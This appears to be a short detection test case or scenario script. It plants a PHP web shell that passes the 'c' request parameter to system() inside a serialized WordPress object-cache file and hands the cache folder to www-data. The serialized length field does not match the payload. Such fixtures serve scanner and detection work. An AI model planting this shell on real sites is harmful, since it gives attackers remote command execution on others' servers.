# category: web
# title: PHP saved by the application in a cache file, to be included later
# indicator: wp-content/cache/object/7f/1c9a.dat
mkdir -p /var/www/wp/wp-content/cache/object/7f
printf 'a:1:{s:4:"note";s:31:"<?php system($_GET["c"]); ?>";}' >/var/www/wp/wp-content/cache/object/7f/1c9a.dat
chown -R www-data:www-data /var/www/wp/wp-content/cache
